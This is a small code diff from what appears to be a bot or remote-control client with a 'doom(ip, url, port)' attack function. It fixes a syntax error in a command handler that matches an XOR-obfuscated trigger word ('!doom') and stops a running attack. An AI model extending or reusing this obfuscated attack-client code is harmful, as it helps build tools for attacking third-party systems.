@@ -27,7 +27,7 @@ def doom(ip, url, port):
       
 
 #open url command for client. should be added to the handle function
-elif command[0] == xor_dec('QBcLCQo=',key)#encoded word !doom
+elif command[0] == xor_dec('QBcLCQo=',key):#encoded word !doom
   if attack != 0:
     stop = True
     attack = 0
